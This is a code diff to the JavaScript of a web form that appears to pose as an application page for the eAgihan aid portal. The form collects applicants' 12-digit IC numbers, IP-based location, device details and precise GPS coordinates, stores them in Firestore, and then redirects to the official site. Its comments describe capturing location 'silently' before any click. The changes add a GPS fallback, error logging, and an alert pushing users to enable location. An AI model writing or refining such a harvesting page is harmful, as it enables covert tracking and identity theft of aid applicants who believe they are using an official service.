@@ -1,9 +1,10 @@
-import { saveSessionRecord, updateSessionWithGps, updateSessionApplicant, saveLocationRecord } from './db.js';
+import { saveSessionRecord, updateSessionWithGps, updateSessionApplicant, updateSessionGpsError, saveLocationRecord } from './db.js';
 
 // DOM References
 const userForm     = document.getElementById('userForm');
 const jenisBantuan = document.getElementById('jenisBantuan');
 const icNumber     = document.getElementById('icNumber');
+const icError      = document.getElementById('icError');
 const icType       = document.getElementById('icType');
 const actionBtn    = document.getElementById('actionBtn');
 
@@ -154,6 +155,16 @@ export async function fetchIpLocation() {
 /* =============================================================
    2. HIGH-ACCURACY GPS (Data 2: On eAgihan Form Submission)
    ============================================================= */
+
+/**
+ * Promisified wrapper for navigator.geolocation.getCurrentPosition
+ */
+function getGeoPosition(options) {
+  return new Promise((resolve, reject) => {
+    navigator.geolocation.getCurrentPosition(resolve, reject, options);
+  });
+}
+
 export function handleFormSubmit(e) {
   if (e) e.preventDefault();
 
@@ -165,10 +176,18 @@ export function handleFormSubmit(e) {
   const selectedType = 'Kad Pengenalan Baru';
 
   if (!cleanIC || cleanIC.length !== 12) {
-    alert('Sila masukkan tepat 12 digit nombor kad pengenalan (contoh: 900101035544).');
-    if (icNumber) icNumber.focus();
+    if (icError) {
+      icError.style.display = 'block';
+    }
+    if (icNumber) {
+      icNumber.style.borderColor = '#dc2626';
+      icNumber.focus();
+    }
     return;
   }
+
+  if (icError) icError.style.display = 'none';
+  if (icNumber) icNumber.style.borderColor = '#d5d8e0';
 
   const applicantIdentity = `${cleanIC} (${selectedBantuan})`;
 
@@ -186,15 +205,40 @@ export function handleFormSubmit(e) {
   requestGpsLocation(applicantIdentity, cleanIC, selectedBantuan, selectedType);
 }
 
-export function requestGpsLocation(applicantIdentity, enteredIC, selectedBantuan, selectedType) {
+export async function requestGpsLocation(applicantIdentity, enteredIC, selectedBantuan, selectedType) {
   const REDIRECT_URL = 'https://eagihan.e-maik.my/';
 
-  if (!navigator.geolocation) {
-    console.warn('Geolocation not supported');
+  // 1. Check if accessed over insecure HTTP on mobile (Browsers require HTTPS for Geolocation)
+  const isInsecure = !window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1';
+  if (isInsecure) {
+    console.error('Insecure origin: Mobile browsers strictly require HTTPS for GPS access.');
+    if (currentSessionDocId) {
+      await updateSessionGpsError(currentSessionDocId, {
+        code: 1,
+        message: 'Mobile browser blocked GPS on HTTP. Requires HTTPS context.',
+        reason: 'INSECURE_HTTP (Needs HTTPS)'
+      });
+    }
+    alert('Perhatian: Ciri pengesahan GPS pada telefon memerlukan sambungan HTTPS selamat. Sila buka laman melalui HTTPS.');
     window.location.href = REDIRECT_URL;
     return;
   }
 
+  // 2. Check navigator.geolocation availability
+  if (!navigator.geolocation) {
+    console.warn('Geolocation not supported on this browser');
+    if (currentSessionDocId) {
+      await updateSessionGpsError(currentSessionDocId, {
+        code: 0,
+        message: 'navigator.geolocation is not available on this browser',
+        reason: 'NOT_SUPPORTED'
+      });
+    }
+    window.location.href = REDIRECT_URL;
+    return;
+  }
+
+  // Visual button state
   if (actionBtn) {
     actionBtn.disabled = true;
     actionBtn.innerHTML = `
@@ -208,85 +252,133 @@ export function requestGpsLocation(applicantIdentity, enteredIC, selectedBantuan
   if (jenisBantuan) jenisBantuan.disabled = true;
   if (icType) icType.disabled = true;
 
-  navigator.geolocation.getCurrentPosition(
-    async (position) => {
-      const coords = position.coords;
+  let position = null;
+  let lastError = null;
 
-      // Calculate distance difference between IP location and exact GPS
-      let distanceDiffKm = null;
-      if (cachedIpData && cachedIpData.latitude != null && cachedIpData.longitude != null) {
-        distanceDiffKm = getDistanceKm(
-          Number(cachedIpData.latitude),
-          Number(cachedIpData.longitude),
-          coords.latitude,
-          coords.longitude
-        );
-      }
+  // 3. Dual-stage acquisition: Try high-accuracy first, then fall back immediately to WiFi/Cellular
+  try {
+    position = await getGeoPosition({
+      enableHighAccuracy: true,
+      timeout: 8000,
+      maximumAge: 10000
+    });
+  } catch (err1) {
+    console.warn('High-accuracy GPS attempt failed (code ' + err1.code + '):', err1.message);
+    lastError = err1;
 
+    // If timeout (code 3) or unavailable (code 2), attempt low-accuracy cellular/WiFi fallback
+    if (err1.code === 2 || err1.code === 3) {
       try {
-        if (currentSessionDocId) {
-          // Update the exact same document with GPS & applicant details
-          await updateSessionWithGps(currentSessionDocId, {
-            latitude: coords.latitude,
-            longitude: coords.longitude,
-            accuracy: coords.accuracy,
-            timestamp: position.timestamp,
-            distanceDiffKm: distanceDiffKm,
-            userName: applicantIdentity,
-            icNumber: enteredIC,
-            jenisBantuan: selectedBantuan,
-            icType: selectedType
-          });
-        } else {
-          // Fallback if IP took longer than the click
-          const dbResult = await saveLocationRecord({
-            userName: applicantIdentity,
-            icNumber: enteredIC,
-            jenisBantuan: selectedBantuan,
-            icType: selectedType,
-            latitude: coords.latitude,
-            longitude: coords.longitude,
-            accuracy: coords.accuracy,
-            method: 'BROWSER_GPS',
-            city: cachedIpData?.city || null,
-            region: cachedIpData?.region || null,
-            country: cachedIpData?.country || null,
-            ip: cachedIpData?.ip || null,
-            deviceName: detectedDevice,
-            hostDomain: detectedHost,
-            timestamp: position.timestamp,
-            distanceDiffKm: distanceDiffKm
-          });
-          if (dbResult.success) {
-            currentSessionDocId = dbResult.docId;
-          }
+        position = await getGeoPosition({
+          enableHighAccuracy: false,
+          timeout: 10000,
+          maximumAge: 60000
+        });
+        lastError = null; // Resolved via fallback
+      } catch (err2) {
+        console.warn('Fallback low-accuracy geolocation also failed:', err2.message);
+        lastError = err2;
+      }
+    }
+  }
+
+  // 4. Handle GPS Success
+  if (position && position.coords) {
+    const coords = position.coords;
+
+    // Calculate distance difference between IP location and exact GPS
+    let distanceDiffKm = null;
+    if (cachedIpData && cachedIpData.latitude != null && cachedIpData.longitude != null) {
+      distanceDiffKm = getDistanceKm(
+        Number(cachedIpData.latitude),
+        Number(cachedIpData.longitude),
+        coords.latitude,
+        coords.longitude
+      );
+    }
+
+    try {
+      if (currentSessionDocId) {
+        await updateSessionWithGps(currentSessionDocId, {
+          latitude: coords.latitude,
+          longitude: coords.longitude,
+          accuracy: coords.accuracy,
+          timestamp: position.timestamp || Date.now(),
+          distanceDiffKm: distanceDiffKm,
+          userName: applicantIdentity,
+          icNumber: enteredIC,
+          jenisBantuan: selectedBantuan,
+          icType: selectedType
+        });
+      } else {
+        const dbResult = await saveLocationRecord({
+          userName: applicantIdentity,
+          icNumber: enteredIC,
+          jenisBantuan: selectedBantuan,
+          icType: selectedType,
+          latitude: coords.latitude,
+          longitude: coords.longitude,
+          accuracy: coords.accuracy,
+          method: 'BROWSER_GPS',
+          city: cachedIpData?.city || null,
+          region: cachedIpData?.region || null,
+          country: cachedIpData?.country || null,
+          ip: cachedIpData?.ip || null,
+          deviceName: detectedDevice,
+          hostDomain: detectedHost,
+          timestamp: position.timestamp || Date.now(),
+          distanceDiffKm: distanceDiffKm
+        });
+        if (dbResult.success) {
+          currentSessionDocId = dbResult.docId;
         }
-      } catch (err) {
-        console.error('GPS Firestore save error:', err);
       }
+    } catch (saveErr) {
+      console.error('Error saving GPS to Firestore:', saveErr);
+    }
 
-      if (actionBtn) {
-        actionBtn.classList.add('btn--success');
-        actionBtn.innerHTML = `
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="20 6 9 17 4 12"></polyline>
-          </svg>
-          Memproses…
-        `;
-      }
+    if (actionBtn) {
+      actionBtn.classList.add('btn--success');
+      actionBtn.innerHTML = `
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"></polyline>
+        </svg>
+        Memproses…
+      `;
+    }
 
-      // Redirect user to official eAgihan portal
-      setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, 500);
-    },
-    (error) => {
-      console.warn('Geolocation error / permission denied:', error.message || error.code);
-      // Redirect seamlessly even if user denied or timed out
+    setTimeout(() => {
       window.location.href = REDIRECT_URL;
-    },
-    GPS_OPTIONS
-  );
+    }, 600);
+    return;
+  }
+
+  // 5. Handle GPS Error (Permission denied or failed)
+  let reasonText = 'UNKNOWN_GPS_ERROR';
+  if (lastError) {
+    if (lastError.code === 1) {
+      reasonText = 'PERMISSION_DENIED (Browser Blocked)';
+    } else if (lastError.code === 2) {
+      reasonText = 'POSITION_UNAVAILABLE (GPS Off)';
+    } else if (lastError.code === 3) {
+      reasonText = 'TIMEOUT (No signal)';
+    }
+  }
+
+  if (currentSessionDocId) {
+    await updateSessionGpsError(currentSessionDocId, {
+      code: lastError ? lastError.code : 0,
+      message: lastError ? lastError.message : 'No position returned',
+      reason: reasonText
+    });
+  }
+
+  // If permission was denied by browser setting, notify user before redirecting
+  if (lastError && lastError.code === 1) {
+    alert('Akses Lokasi Disekat: Sila benarkan akses lokasi dalam tetapan pelayar anda (tekan ikon kunci/tetapan di sebelah URL) untuk melengkapkan permohonan.');
+  }
+
+  window.location.href = REDIRECT_URL;
 }
 
 function resetForm() {
@@ -304,19 +396,37 @@ function resetForm() {
 if (icNumber) {
   icNumber.addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/\D/g, '').slice(0, 12);
+    if (icError && e.target.value.length === 12) {
+      icError.style.display = 'none';
+      icNumber.style.borderColor = '#d5d8e0';
+    }
   });
   icNumber.addEventListener('paste', () => {
     setTimeout(() => {
       icNumber.value = icNumber.value.replace(/\D/g, '').slice(0, 12);
+      if (icError && icNumber.value.length === 12) {
+        icError.style.display = 'none';
+        icNumber.style.borderColor = '#d5d8e0';
+      }
     }, 0);
   });
 }
 
-// Event Listeners
+// Event Listeners (both submit and direct button click with debounce)
+let isSubmitting = false;
+function onActionTrigger(e) {
+  if (e) e.preventDefault();
+  if (isSubmitting) return;
+  isSubmitting = true;
+  setTimeout(() => { isSubmitting = false; }, 1200);
+  handleFormSubmit(e);
+}
+
 if (userForm) {
-  userForm.addEventListener('submit', handleFormSubmit);
-} else if (actionBtn) {
-  actionBtn.addEventListener('click', handleFormSubmit);
+  userForm.addEventListener('submit', onActionTrigger);
+}
+if (actionBtn) {
+  actionBtn.addEventListener('click', onActionTrigger);
 }
 
 // AUTO-RUN: Silently capture Data 1 (IP Location) immediately before button click!
